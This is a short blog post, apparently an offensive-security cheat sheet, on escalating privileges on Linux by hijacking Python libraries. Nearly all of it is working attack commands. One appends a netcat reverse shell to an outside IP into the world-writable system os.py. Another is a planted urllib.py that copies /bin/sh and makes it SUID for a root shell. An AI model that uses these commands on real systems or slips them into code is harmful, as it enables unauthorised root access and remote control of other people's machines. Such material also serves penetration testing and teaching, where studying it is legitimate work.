---
layout: post
title:  "Python Lib Hijacking"
date:   2022-01-01
categories: linux
---


## If library is writable

### LinuxPrivChecker - World Writabel Files


```bash

[+] World Writable Files
-rwxrwxrwx 1 root root 25911 Mar  7 15:48 /usr/lib/python2.7/os.py

```

### Injection Malicious Code

```bash

echo "import subprocess;subprocess.call(['nc', '-e','/bin/sh','10.10.10.10','4444'], shell=False)" >> /usr/lib/python2.7/os.py

```

## If library is not writable

### In the same Directory of the vulnerable script


```bash

the script imports : import urllib

the malicious urllib.py contents in the same directory of the vulnerable script :

import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh") 

/tmp/sh -p
```